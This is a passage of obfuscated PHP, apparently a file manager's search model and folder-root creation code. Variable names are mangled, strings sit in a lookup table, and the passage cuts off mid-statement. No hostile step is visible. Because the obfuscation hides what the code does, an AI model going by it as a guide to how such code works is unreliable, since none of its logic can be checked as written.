$Ä×«ı¯[$äğÕÓÏ[174]]; $îäüÙÂä = $äğÕÓÏ[7]; if (!$Ä×«ı¯[$äğÕÓÏ[174]]) { $ôÁ¢§¿é = array_to_keyvalue($ºª»–é÷, $äğÕÓÏ[12], $äğÕÓÏ[174]); $¥­¨ùñå = implode($äğÕÓÏ[50], $ôÁ¢§¿é); $îäüÙÂä = $äğÕÓÏ[2114]; } $Í´äÈò½ = explode($äğÕÓÏ[50], trim($¥­¨ùñå, $äğÕÓÏ[50])); return array($îäüÙÂä, $Í´äÈò½); } public function listPathType($‘…ıµà) { $«Ö´¥¯º =& $_SERVER[óó‹¸‚å]; $¼èã½ÙÂ = $this->fileTypeWhere($‘…ıµà); if (!$¼èã½ÙÂ) { return array(); } $‡ÛÓÆâ‡ = USER_ID; $ú¾³ÑÒ½ = Model($«Ö´¥¯º[535])->getInfo($‡ÛÓÆâ‡); $²õÖ¾å† = array($«Ö´¥¯º[586] => SourceModel::TYPE_USER, $«Ö´¥¯º[521] => array($«Ö´¥¯º[550], $«Ö´¥¯º[531] . $ú¾³ÑÒ½[$«Ö´¥¯º[86]][$«Ö´¥¯º[402]] . $«Ö´¥¯º[551]), $«Ö´¥¯º[587] => $‡ÛÓÆâ‡, $«Ö´¥¯º[583] => 0, $«Ö´¥¯º[584] => $¼èã½ÙÂ); return $this->listSource($²õÖ¾å†); } public function listSearch($Íß±Ú¤ˆ, $»Î¯¤Òº = 300) { $°¤¾“ƒ =& $_SERVER[óó‹¸‚å]; if (isset($Íß±Ú¤ˆ[$°¤¾“ƒ[1957]]) && $Íß±Ú¤ˆ[$°¤¾“ƒ[1957]]) { $Íß±Ú¤ˆ[$°¤¾“ƒ[1957]] = str_replace($°¤¾“ƒ[384], $°¤¾“ƒ[2115], trim($Íß±Ú¤ˆ[$°¤¾“ƒ[1957]])); } $ñ¬€óØÄ = $this->_parseSearchWhere($Íß±Ú¤ˆ); if (!isset($ñ¬€óØÄ[$°¤¾“ƒ[431]])) { $ñ¬€óØÄ[$°¤¾“ƒ[431]] = 0; } $šË°¼Ä‘ = $°¤¾“ƒ[2116]; $ùäµàï = $ñ¬€óØÄ; $¶æ° ¶Ï = $šË°¼Ä‘; $this->_listSearchBindPinyin($Íß±Ú¤ˆ, $ñ¬€óØÄ, $šË°¼Ä‘); $this->alias($°¤¾“ƒ[446])->_makeOrder(); $ñ¬€óØÄ = $this->parseWhereLike($ñ¬€óØÄ); $€Â¤ÓÓ = $this->distinct(!0)->field($šË°¼Ä‘)->where($ñ¬€óØÄ)->selectPage($»Î¯¤Òº); if ($GLOBALS[$°¤¾“ƒ[6]][$°¤¾“ƒ[381]][$°¤¾“ƒ[382]] && Input::check($Íß±Ú¤ˆ[$°¤¾“ƒ[1957]], $°¤¾“ƒ[593]) && $€Â¤ÓÓ[$°¤¾“ƒ[366]][$°¤¾“ƒ[353]] == 1 && $€Â¤ÓÓ[$°¤¾“ƒ[366]][$°¤¾“ƒ[367]] == 0) { $€Â¤ÓÓ = $this->distinct(!0)->field($šË°¼Ä‘)->where($ùäµàï)->limit(1000)->select(); $€Â¤ÓÓ = array_page_split($€Â¤ÓÓ, !1, $»Î¯¤Òº); } $this->_listSearchFileContent($€Â¤ÓÓ, $Íß±Ú¤ˆ, $¶æ° ¶Ï, $ùäµàï); $this->_listSearchDesc($€Â¤ÓÓ, $Íß±Ú¤ˆ, $¶æ° ¶Ï); $this->_listSearchTag($€Â¤ÓÓ, $Íß±Ú¤ˆ, $¶æ° ¶Ï); $this->_listSearchGroupTag($€Â¤ÓÓ, $Íß±Ú¤ˆ, $¶æ° ¶Ï); $this->_listDataApply($€Â¤ÓÓ[$°¤¾“ƒ[369]]); $this->_listMake($€Â¤ÓÓ); return $€Â¤ÓÓ; } private function _listSearchFileContent(&$¡ÆÙ´¶‡, $ûû¬İä¦, $À™—Ñ‘å, $Ê’¨¾ĞŸ) { $óË¸Š¿ˆ =& $_SERVER[óó‹¸‚å]; if (!$ûû¬İä¦[$óË¸Š¿ˆ[1957]] || $¡ÆÙ´¶‡[$óË¸Š¿ˆ[366]][$óË¸Š¿ˆ[353]] > 1) { return; } if (!isset($Ê’¨¾ĞŸ[$óË¸Š¿ˆ[32]]) || !is_array($ûû¬İä¦[$óË¸Š¿ˆ[468]])) { return; } $Ê’¨¾ĞŸ[$óË¸Š¿ˆ[468]] = array($óË¸Š¿ˆ[7], $ûû¬İä¦[$óË¸Š¿ˆ[468]]); unset($Ê’¨¾ĞŸ[$óË¸Š¿ˆ[32]]); unset($ûû¬İä¦[$óË¸Š¿ˆ[468]]); $¶´Ë²ŸŒ = $this->field($À™—Ñ‘å)->where($Ê’¨¾ĞŸ)->limit($óË¸Š¿ˆ[2117])->select(); if (!$¶´Ë²ŸŒ || count($¶´Ë²ŸŒ) == 0) { return; } $¡ÆÙ´¶‡[$óË¸Š¿ˆ[369]] = array_merge($¶´Ë²ŸŒ, $¡ÆÙ´¶‡[$óË¸Š¿ˆ[369]]); $¡ÆÙ´¶‡[$óË¸Š¿ˆ[366]][$óË¸Š¿ˆ[367]] += count($¶´Ë²ŸŒ); } private function _listSearchTag(&$…Ä’³Í, $¶ˆÑ‘æ¤, $ì•«Ì‘¿) { $×°úŠö‹ =& $_SERVER[óó‹¸‚å]; if (!$¶ˆÑ‘æ¤[$×°úŠö‹[1957]] || $…Ä’³Í[$×°úŠö‹[366]][$×°úŠö‹[353]] > 1) { return; } $¬Î¿šÁ  = Model($×°úŠö‹[2118])->listData(); $¦•ç± = array(); $¥åğ­ÔØ = $¶ˆÑ‘æ¤[$×°úŠö‹[1957]]; foreach ($¬Î¿šÁ  as $“Çõè•Ã) { $îâ£èÂ² = $“Çõè•Ã[$×°úŠö‹[32]]; $°Üç¹è» = str_replace($×°úŠö‹[53], $×°úŠö‹[12], Pinyin::get($îâ£èÂ²)); if (stripos($îâ£èÂ², $¥åğ­ÔØ) !== !1 || stripos($°Üç¹è», $¥åğ­ÔØ) !== !1) { $¦•ç±[] = $“Çõè•Ã[$×°úŠö‹[399]]; } } if (!$¦•ç±) { return; } $Œ»œ¥Üû = array($×°úŠö‹[426] => array($×°úŠö‹[7], $¦•ç±), $×°úŠö‹[1674] => USER_ID); $Ú²Ñ“  = Model($×°úŠö‹[428])->field($×°úŠö‹[84])->where($Œ»œ¥Üû)->select(); $Ú²Ñ“  = array_to_keyvalue($Ú²Ñ“ , $×°úŠö‹[12], $×°úŠö‹[84]); $êÎïª—ı = array_unique($Ú²Ñ“ ); $this->_listSearchMerge($…Ä’³Í, $¶ˆÑ‘æ¤, $ì•«Ì‘¿, $êÎïª—ı); } private function _listSearchDesc(&$ší¦ñ, $¿ÇçœÆ¹, $±¸€à×) { $¤ïËúÑÒ =& $_SERVER[óó‹¸‚å]; if (!$¿ÇçœÆ¹[$¤ïËúÑÒ[1957]] || $ší¦ñ[$¤ïËúÑÒ[366]][$¤ïËúÑÒ[353]] > 1) { return; } $ü¥”é‚ù = array($¤ïËúÑÒ[94] => $¤ïËúÑÒ[453], $¤ïËúÑÒ[374] => array($¤ïËúÑÒ[383], $¤ïËúÑÒ[1959] . $¿ÇçœÆ¹[$¤ïËúÑÒ[1957]] . $¤ïËúÑÒ[1959])); $¡µ´ = !1; if ($¡µ´) { $ÕÁÄÕ„ò = $this->listSearchChildren($¿ÇçœÆ¹[$¤ïËúÑÒ[432]]); $ÕÁÄÕ„ò = array_unique($ÕÁÄÕ„ò); if (!$ÕÁÄÕ„ò) { return; } $ü¥”é‚ù[$¤ïËúÑÒ[402]] = array($¤ïËúÑÒ[7], $ÕÁÄÕ„ò); } $ˆÏ›ù·˜ = Model($¤ïËúÑÒ[569])->field($¤ïËúÑÒ[402])->where($ü¥”é‚ù)->limit(5000)->select(); $Öªæí• = array_to_keyvalue($ˆÏ›ù·˜, $¤ïËúÑÒ[12], $¤ïËúÑÒ[402]); $this->_listSearchMerge($ší¦ñ, $¿ÇçœÆ¹, $±¸€à×, $Öªæí•); } private function _listSearchGroupTag(&$…¿’—ìï, $é‡î°ì˜, $…È­ó†Ÿ) { $Ş¢”°ª =& $_SERVER[óó‹¸‚å]; if (!$é‡î°ì˜[$Ş¢”°ª[1957]] || $…¿’—ìï[$Ş¢”°ª[366]][$Ş¢”°ª[353]] > 1 || !$é‡î°ì˜[$Ş¢”°ª[432]]) { return; } $ÛşÁ“š = $this->sourceInfo($é‡î°ì˜[$Ş¢”°ª[432]]); if (!$ÛşÁ“š || $ÛşÁ“š[$Ş¢”°ª[411]] != SourceModel::TYPE_GROUP) { return; } $‘ı‚Øûæ = $ÛşÁ“š[$Ş¢”°ª[505]]; $ª©£»“ñ = Model($Ş¢”°ª[2119])->get($‘ı‚Øûæ); $ãÀ­œûã = array(); $¹ĞñŒŒŞ = $é‡î°ì˜[$Ş¢”°ª[1957]]; foreach ($ª©£»“ñ[$Ş¢”°ª[369]] as $ú¢î¾) { $Ò™¼¨ùã = $ú¢î¾[$Ş¢”°ª[32]]; $ÏÚÙ–£Î = str_replace($Ş¢”°ª[53], $Ş¢”°ª[12], Pinyin::get($Ò™¼¨ùã)); if (stripos($Ò™¼¨ùã, $¹ĞñŒŒŞ) !== !1 || stripos($ÏÚÙ–£Î, $¹ĞñŒŒŞ) !== !1) { $ãÀ­œûã[] = $ú¢î¾[$Ş¢”°ª[399]]; } } if (!$ãÀ­œûã) { return; } $ûŞ Å¬÷ = array($Ş¢”°ª[426] => array($Ş¢”°ª[7], $ãÀ­œûã), $Ş¢”°ª[1674] => 0, $Ş¢”°ª[33] => $Ş¢”°ª[1979] . $‘ı‚Øûæ); $ì¤‰“Á = Model($Ş¢”°ª[428])->field($Ş¢”°ª[84])->where($ûŞ Å¬÷)->select(); $ì¤‰“Á = array_to_keyvalue($ì¤‰“Á, $Ş¢”°ª[12], $Ş¢”°ª[84]); $‰ºıæÍ× = array_unique($ì¤‰“Á); $this->_listSearchMerge($…¿’—ìï, $é‡î°ì˜, $…È­ó†Ÿ, $‰ºıæÍ×); } private function _listSearchMerge(&$Ê¯åî”, $ææ†–×—, $Úù“¢“Æ, $’ûåôë‘) { $ˆÄ¿ğ‚Ò =& $_SERVER[óó‹¸‚å]; if (!$’ûåôë‘) { return; } $Ø—“Ãê¬ = array_to_keyvalue($Ê¯åî”[$ˆÄ¿ğ‚Ò[369]], $ˆÄ¿ğ‚Ò[12], $ˆÄ¿ğ‚Ò[402]); $æ’ĞøŞ = array_diff($’ûåôë‘, $Ø—“Ãê¬); if (!$æ’ĞøŞ) { return; } $ğ©Ã·œ… = array($ˆÄ¿ğ‚Ò[402] => array($ˆÄ¿ğ‚Ò[7], $æ’ĞøŞ)); $œÊìâÍÇ = $this->field($Úù“¢“Æ)->where($ğ©Ã·œ…)->select(); if (!$œÊìâÍÇ) { return; } $Ò£ŸÀ™ı = array(); foreach ($œÊìâÍÇ as $öÅ¹˜ïÇ) { if ($this->_listSearchFilter($öÅ¹˜ïÇ, $ææ†–×—)) { $Ò£ŸÀ™ı[] = $öÅ¹˜ïÇ; } } $Ê¯åî”[$ˆÄ¿ğ‚Ò[369]] = array_merge($Ò£ŸÀ™ı, $Ê¯åî”[$ˆÄ¿ğ‚Ò[369]]); $Ê¯åî”[$ˆÄ¿ğ‚Ò[366]][$ˆÄ¿ğ‚Ò[367]] += count($Ò£ŸÀ™ı); } private function _listSearchFilter($¸ŞÚ´â, $äÄ×¡Û) { $œ†˜æ¡ô =& $_SERVER[óó‹¸‚å]; $»‰¶ˆŞâ = $¸ŞÚ´â[$œ†˜æ¡ô[410]] == $œ†˜æ¡ô[88]; if (!strstr($¸ŞÚ´â[$œ†˜æ¡ô[521]], $œ†˜æ¡ô[50] . $äÄ×¡Û[$œ†˜æ¡ô[432]] . $œ†˜æ¡ô[50])) { return !1; } if (isset($äÄ×¡Û[$œ†˜æ¡ô[412]]) && $äÄ×¡Û[$œ†˜æ¡ô[412]] != $œ†˜æ¡ô[1918]) { if ($äÄ×¡Û[$œ†˜æ¡ô[412]] == $œ†˜æ¡ô[75] && !$»‰¶ˆŞâ) { return !1; } if ($äÄ×¡Û[$œ†˜æ¡ô[412]] != $œ†˜æ¡ô[75] && $»‰¶ˆŞâ) { return !1; } if (!strstr($¸ŞÚ´â[$œ†˜æ¡ô[174]], $œ†˜æ¡ô[50] . $äÄ×¡Û[$œ†˜æ¡ô[412]] . $œ†˜æ¡ô[50])) { return !1; } } if (isset($äÄ×¡Û[$œ†˜æ¡ô[2120]]) && $äÄ×¡Û[$œ†˜æ¡ô[2120]] < $¸ŞÚ´â[$œ†˜æ¡ô[76]]) { return !1; } if (isset($äÄ×¡Û[$œ†˜æ¡ô[2121]]) && $äÄ×¡Û[$œ†˜æ¡ô[2121]] > $¸ŞÚ´â[$œ†˜æ¡ô[76]]) { return !1; } if (isset($äÄ×¡Û[$œ†˜æ¡ô[600]]) && $äÄ×¡Û[$œ†˜æ¡ô[600]] != $¸ŞÚ´â[$œ†˜æ¡ô[456]]) { return !1; } return !0; } public function listSearchChildren($¯ãóŠ•Ú, $Ù¹ä²ÔÍ = 5000) { $ğ£ˆ¤† =& $_SERVER[óó‹¸‚å]; $ÌÔÑÈ” = array(); $°âÂ¦ùË = $this->sourceInfo($¯ãóŠ•Ú); $ÁÔïô© = array($ğ£ˆ¤†[521] => array($ğ£ˆ¤†[383], $°âÂ¦ùË[$ğ£ˆ¤†[521]] . $°âÂ¦ùË[$ğ£ˆ¤†[402]] . $ğ£ˆ¤†[551])); $åÎÏ‡öŞ = $this->field($ğ£ˆ¤†[76])->where($ÁÔïô©)->limit($Ù¹ä²ÔÍ + 1)->select(); $…ÅÜ¦ŒÜ = is_array($åÎÏ‡öŞ) ? count($åÎÏ‡öŞ) : 0; if ($…ÅÜ¦ŒÜ > $Ù¹ä²ÔÍ) { return $this->_listSearchChildrenNear($¯ãóŠ•Ú, $Ù¹ä²ÔÍ); } $ÆüŠÈ£ù = $this->field($ğ£ˆ¤†[402])->where($ÁÔïô©)->select(); $ÌÔÑÈ” = array_to_keyvalue($ÆüŠÈ£ù, $ğ£ˆ¤†[12], $ğ£ˆ¤†[402]); return $ÌÔÑÈ”; } private function _listSearchChildrenNear($ó°Óà²â, $ßÂüÕ¶¶) { $é÷¦€–› =& $_SERVER[óó‹¸‚å]; $–ùØÚï‹ = array(); $Ïª…¡¨Ú = array($é÷¦€–›[432] => $ó°Óà²â); $´ĞÙ©ª˜ = $this->field($é÷¦€–›[2122])->where($Ïª…¡¨Ú)->select(); $Õ´ôİÆŸ = array_to_keyvalue(array_filter_by_field($´ĞÙ©ª˜, $é÷¦€–›[410], $é÷¦€–›[88]), $é÷¦€–›[12], $é÷¦€–›[402]); $–ùØÚï‹ = array_merge($–ùØÚï‹, array_to_keyvalue($´ĞÙ©ª˜, $é÷¦€–›[12], $é÷¦€–›[402])); if (!$Õ´ôİÆŸ) { return $–ùØÚï‹; } $Ïª…¡¨Ú = array($é÷¦€–›[432] => array($é÷¦€–›[7], $Õ´ôİÆŸ)); $´ĞÙ©ª˜ = $this->field($é÷¦€–›[2122])->where($Ïª…¡¨Ú)->limit($ßÂüÕ¶¶)->select(); $–ùØÚï‹ = array_merge($–ùØÚï‹, array_to_keyvalue($´ĞÙ©ª˜, $é÷¦€–›[12], $é÷¦€–›[402])); $–ùØÚï‹ = array_slice($–ùØÚï‹, 0, $ßÂüÕ¶¶); return $–ùØÚï‹; } private function _listSearchBindPinyin($ÄÏñØˆÁ, &$™ıÉ¢Ó¥, &$áİåıí) { $µ¿ÚÓÅ‘ =& $_SERVER[óó‹¸‚å]; if (!isset($ÄÏñØˆÁ[$µ¿ÚÓÅ‘[1957]]) || !$ÄÏñØˆÁ[$µ¿ÚÓÅ‘[1957]]) { return; } if (!Input::check($ÄÏñØˆÁ[$µ¿ÚÓÅ‘[1957]], $µ¿ÚÓÅ‘[318]) || strlen($ÄÏñØˆÁ[$µ¿ÚÓÅ‘[1957]]) < 2) { return; } $ìİåç‘™ = "\114\x45\106\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x73\157\165\162\x63\145\x5f\x6d\x65\164\141\x20\x6d\145\164\141\40\157\156\x20\x73\x6f\x75\x72\143\145\x2e\163\x6f\x75\x72\143\x65\x49\x44\x20\75\x20\x6d\x65\164\x61\x2e\163\157\165\x72\x63\x65\111\104"; $Ä³èĞ“û = array(); $áİåıí = str_replace(array($µ¿ÚÓÅ‘[231], $µ¿ÚÓÅ‘[53], $µ¿ÚÓÅ‘[2123]), $µ¿ÚÓÅ‘[12], $áİåıí); $áİåıí = $µ¿ÚÓÅ‘[438] . str_replace($µ¿ÚÓÅ‘[50], $µ¿ÚÓÅ‘[439], $áİåıí); $™“¸á = $™ıÉ¢Ó¥[$µ¿ÚÓÅ‘[32]]; unset($™ıÉ¢Ó¥[$µ¿ÚÓÅ‘[32]]); foreach ($™ıÉ¢Ó¥ as $£”‚˜ ô => $‰Â¬·¼) { $Ä³èĞ“û[$µ¿ÚÓÅ‘[438] . $£”‚˜ ô] = $‰Â¬·¼; } foreach ($™“¸á as $ƒ§ÙÜÀØ) { $Ä³èĞ“û[] = array($µ¿ÚÓÅ‘[443] => $ƒ§ÙÜÀØ, $µ¿ÚÓÅ‘[1007] => $µ¿ÚÓÅ‘[1961], array($µ¿ÚÓÅ‘[2124] => $ƒ§ÙÜÀØ, $µ¿ÚÓÅ‘[2125] => array($µ¿ÚÓÅ‘[7], array($µ¿ÚÓÅ‘[465], $µ¿ÚÓÅ‘[464])))); } $this->join($ìİåç‘™); $™ıÉ¢Ó¥ = $Ä³èĞ“û; } private function _parseSearchWhere($Ïµ“Ÿ„Ş) { $£í‰¬ğ¦ =& $_SERVER[óó‹¸‚å]; $×‹ãí´Ì = array(); if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[765]]) && $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[765]]) { $×‹ãí´Ì[$£í‰¬ğ¦[85]] = array($£í‰¬ğ¦[2126], $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[765]]); } if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[497]]) && $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[497]]) { $şŒ¶ï¾ = array($£í‰¬ğ¦[2127], $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[497]]); if ($×‹ãí´Ì[$£í‰¬ğ¦[85]]) { $×‹ãí´Ì[$£í‰¬ğ¦[85]] = array($×‹ãí´Ì[$£í‰¬ğ¦[85]], $şŒ¶ï¾, $£í‰¬ğ¦[2128]); } else { $×‹ãí´Ì[$£í‰¬ğ¦[85]] = $şŒ¶ï¾; } } if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[2120]]) && $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[2120]] > 0) { $×‹ãí´Ì[$£í‰¬ğ¦[76]] = array($£í‰¬ğ¦[2126], $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[2120]]); } if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[2121]]) && $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[2121]]) { $şŒ¶ï¾ = array($£í‰¬ğ¦[2127], $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[2121]]); if ($×‹ãí´Ì[$£í‰¬ğ¦[76]]) { $×‹ãí´Ì[$£í‰¬ğ¦[76]] = array($×‹ãí´Ì[$£í‰¬ğ¦[76]], $şŒ¶ï¾, $£í‰¬ğ¦[2128]); } else { $×‹ãí´Ì[$£í‰¬ğ¦[76]] = $şŒ¶ï¾; } } if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[600]]) && $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[600]]) { $×‹ãí´Ì[] = array($£í‰¬ğ¦[456] => $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[600]], $£í‰¬ğ¦[454] => $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[600]], $£í‰¬ğ¦[1007] => $£í‰¬ğ¦[1961]); } if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[412]]) && $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[412]]) { $­ÊÄë = $Ïµ“Ÿ„Ş[$£í‰¬ğ¦[412]]; if ($­ÊÄë == $£í‰¬ğ¦[75]) { $×‹ãí´Ì[$£í‰¬ğ¦[410]] = 1; } else { if ($­ÊÄë == $£í‰¬ğ¦[2129]) { $×‹ãí´Ì[$£í‰¬ğ¦[410]] = 0; } else { if ($­ÊÄë) { $­ÊÄë = is_array($­ÊÄë) ? $­ÊÄë : explode($£í‰¬ğ¦[50], $­ÊÄë); $×‹ãí´Ì[$£í‰¬ğ¦[412]] = array($£í‰¬ğ¦[418], $­ÊÄë); $×‹ãí´Ì[$£í‰¬ğ¦[410]] = 0; } } } } $this->_parseSearchParent($Ïµ“Ÿ„Ş, $×‹ãí´Ì); if (isset($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[1957]]) && trim($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[1957]])) { $¹š«Ï³ø = trim($Ïµ“Ÿ„Ş[$£í‰¬ğ¦[1957]]); $¤ËÓ”ÔÏ = explode($£í‰¬ğ¦[53], $¹š«Ï³ø); if (strlen($¹š«Ï³ø) > 2 && (substr($¹š«Ï³ø, 0, 1) == $£í‰¬ğ¦[118] && substr($¹š«Ï³ø, -1) == $£í‰¬ğ¦[118]) || substr($¹š«Ï³ø, 0, 1) == $£í‰¬ğ¦[58] && substr($¹š«Ï³ø, -1) == $£í‰¬ğ¦[58]) { $¹š«Ï³ø = substr($¹š«Ï³ø, 1, -1); $¤ËÓ”ÔÏ = array($¹š«Ï³ø); } $×‹ãí´Ì[$£í‰¬ğ¦[32]] = array(array($£í‰¬ğ¦[550], $£í‰¬ğ¦[1959] . $¹š«Ï³ø . $£í‰¬ğ¦[1959])); if (count($¤ËÓ”ÔÏ) > 1) { $×‹ãí´Ì[$£í‰¬ğ¦[32]] = array(); foreach ($¤ËÓ”ÔÏ as $…ù«¾‰‹) { if (!trim($…ù«¾‰‹)) { continue; } $×‹ãí´Ì[$£í‰¬ğ¦[32]][] = array($£í‰¬ğ¦[550], $£í‰¬ğ¦[1959] . trim($…ù«¾‰‹) . $£í‰¬ğ¦[1959]); } } } return $×‹ãí´Ì; } private function _parseSearchParent($äªñµòƒ, &$¤Æ±·ÓŸ) { $‹”ÄûÄ· =& $_SERVER[óó‹¸‚å]; if (!isset($äªñµòƒ[$‹”ÄûÄ·[432]]) || !$äªñµòƒ[$‹”ÄûÄ·[432]]) { return; } $—ùŠ Úå = $this->pathInfo($äªñµòƒ[$‹”ÄûÄ·[432]]); $ÑÖ³¾ı˜ = $—ùŠ Úå[$‹”ÄûÄ·[432]] . $‹”ÄûÄ·[12] === $‹”ÄûÄ·[197]; $ïí»ĞşÍ = $—ùŠ Úå[$‹”ÄûÄ·[411]] == $‹”ÄûÄ·[515]; if ($—ùŠ Úå[$‹”ÄûÄ·[532]] == $‹”ÄûÄ·[533]) { $×ÙúÜ•Á = $this->sourceInfo($äªñµòƒ[$‹”ÄûÄ·[432]]); $—ùŠ Úå[$‹”ÄûÄ·[521]] = $×ÙúÜ•Á[$‹”ÄûÄ·[521]]; } $¤Æ±·ÓŸ[$‹”ÄûÄ·[590]] = array($‹”ÄûÄ·[550], $—ùŠ Úå[$‹”ÄûÄ·[521]] . $äªñµòƒ[$‹”ÄûÄ·[432]] . $‹”ÄûÄ·[551]); $ûĞûÌ´ = isset($äªñµòƒ[$‹”ÄûÄ·[1822]]) && in_array($‹”ÄûÄ·[515], $äªñµòƒ[$‹”ÄûÄ·[1822]]); if (!$ûĞûÌ´ || !$ïí»ĞşÍ || !$ÑÖ³¾ı˜ || !$—ùŠ Úå[$‹”ÄûÄ·[413]]) { return; } if (!AuthModel::authCheckRoot($—ùŠ Úå[$‹”ÄûÄ·[413]][$‹”ÄûÄ·[414]])) { return; } $‹§¾“Ì” = $—ùŠ Úå[$‹”ÄûÄ·[505]] . $‹”ÄûÄ·[12]; if ($‹§¾“Ì” == $‹”ÄûÄ·[88]) { unset($¤Æ±·ÓŸ[$‹”ÄûÄ·[590]]); $¤Æ±·ÓŸ[$‹”ÄûÄ·[411]] = self::TYPE_GROUP; return; } $şƒÄ¼‘ = Model($‹”ÄûÄ·[522])->groupChildrenAll($‹§¾“Ì”); $Ö¦†³ü½ = count($şƒÄ¼‘); if ($Ö¦†³ü½ <= 1) { return; } $Ã§©îÛ÷ = array($‹”ÄûÄ·[432] => 0, $‹”ÄûÄ·[411] => self::TYPE_GROUP, $‹”ÄûÄ·[505] => array($‹”ÄûÄ·[7], $şƒÄ¼‘)); $ªÑ ˜¶Î = $this->field($‹”ÄûÄ·[2130])->where($Ã§©îÛ÷)->limit($Ö¦†³ü½)->select(); $¤Æ±·ÓŸ[$‹”ÄûÄ·[590]] = array(); foreach ($ªÑ ˜¶Î as $ÑÄÎúªÏ) { $¤Æ±·ÓŸ[$‹”ÄûÄ·[590]][] = array($‹”ÄûÄ·[550], $‹”ÄûÄ·[531] . $ÑÄÎúªÏ[$‹”ÄûÄ·[402]] . $‹”ÄûÄ·[551]); } $¤Æ±·ÓŸ[$‹”ÄûÄ·[590]][] = $‹”ÄûÄ·[1961]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¨ª’Ñœ) { $‰‘¾ŒŞª =& $_SERVER[óó‹¸‚å]; $¡ËìùÌ¤ = Model($‰‘¾ŒŞª[513])->where(array($‰‘¾ŒŞª[1665] => $¨ª’Ñœ))->find(); $Ë÷ÎÛÃ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¨ª’Ñœ, $¡ËìùÌ¤[$‰‘¾ŒŞª[32]]); $this->userDesktopAdd($Ë÷ÎÛÃ); return $Ë÷ÎÛÃ; } public function userDesktopAdd($î™«·âÊ) { $¹ª–’Çå =& $_SERVER[óó‹¸‚å]; $Ëéü‹‰Ş = LNG($¹ª–’Çå[2131]); $šÔß‡–° = $this->mkdir($î™«·âÊ, $Ëéü‹‰Ş); $this->metaSet($šÔß‡–°, $¹ª–’Çå[2132], $¹ª–’Çå[88]); $this->metaSet($î™«·âÊ, $¹ª–’Çå[2133], $šÔß‡–°); } public function userPathSafeAdd($ËŒ†‹Õí) { $ø®†®ªÒ =& $_SERVER[óó‹¸‚å]; $ˆ¬®ÌÛö = Model($ø®†®ªÒ[513])->getInfoFull($ËŒ†‹Õí); if (!$ˆ¬®ÌÛö) { return !1; } if (_get($ˆ¬®ÌÛö, $ø®†®ªÒ[536])) { return $ˆ¬®ÌÛö[$ø®†®ªÒ[466]][$ø®†®ªÒ[2134]]; } $ù’šàÛÄ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ËŒ†‹Õí, $ø®†®ªÒ[2135], $ø®†®ªÒ[433]); Model($ø®†®ªÒ[513])->metaSet($ËŒ†‹Õí, $ø®†®ªÒ[2134], $ù’šàÛÄ); $this->metaSet($ù’šàÛÄ, $ø®†®ªÒ[2136], $ËŒ†‹Õí); return $ù’šàÛÄ; } public function groupRootAdd($Ì¯ø–çÙ) { $ŸíëùÂ‚ =& $_SERVER[óó‹¸‚å]; $ò«Ê§íü = Model($ŸíëùÂ‚[522])->where(array($ŸíëùÂ‚[1951] => $Ì¯ø–çÙ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ì¯ø–çÙ, $ò«Ê§íü[$ŸíëùÂ‚[32]]); } public function systemRootPathAdd($¦€Ğ¤ú) { if ($¦€Ğ¤ú != $_SERVER[óó‹¸‚å][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¦€Ğ¤ú); } public function userRootRemove($Ù™Õ¼‡Ö) { $ÓÛë†ƒ– = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ù™Õ¼‡Ö, !0); foreach ($ÓÛë†ƒ– as $’´äşèˆ) { if (!$’´äşèˆ) { continue; } $this->remove($’´äşèˆ[$_SERVER[óó‹¸‚å][402]], !1); } } public function groupRootRemove($ë×¿½ó) { $ú–¶ÌİÍ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ë×¿½ó); if (!$ú–¶ÌİÍ) { return; } $this->remove($ú–¶ÌİÍ[$_SERVER[óó‹¸‚å][402]], !1); } private function _mkdirRoot($ŒåÌĞÂ, $…ÉÕæª¦, $˜ÃÇÄÎŒ, $¦ŞŸóô = '') { $¹çÄ¸ÍŞ =& $_SERVER[óó‹¸‚å]; $éëøá×† = array($¹çÄ¸ÍŞ[401] => 0, $¹çÄ¸ÍŞ[586] => $ŒåÌĞÂ, $¹çÄ¸ÍŞ[587] => $…ÉÕæª¦, $¹çÄ¸ÍŞ[583] => 1, $¹çÄ¸ÍŞ[588] => USER_ID, $¹çÄ¸ÍŞ[589] => USER_ID, $¹çÄ¸ÍŞ[584] => $¦ŞŸóô, $¹çÄ¸ÍŞ[590] => $¹çÄ¸ÍŞ[531], $¹çÄ¸ÍŞ[430] => 0, $¹çÄ¸ÍŞ[585] => 0, $¹çÄ¸ÍŞ[469] => 0, $¹çÄ¸ÍŞ[591] => $¹çÄ¸ÍŞ[12]); if ($ô Ç½Îş = $this->where($éëøá×†)->find()) { return $ô Ç½Îş[$¹çÄ¸ÍŞ[402]]; } $Œ´÷Ô º = "\x4d\x6f\x64\x65\x6c\x53\157\x75\162\143\x65\x2e\155\x6b\144\x69\x72\122\157\x6f\x74\56{$ŒåÌĞÂ}\x2e{$…ÉÕæª¦}\56" . $˜ÃÇÄÎŒ; CacheLock::lock($Œ´÷Ô º); $éëøá×†[$¹çÄ¸ÍŞ[32]] = $˜ÃÇÄÎŒ; $ïõø·Õ˜ = 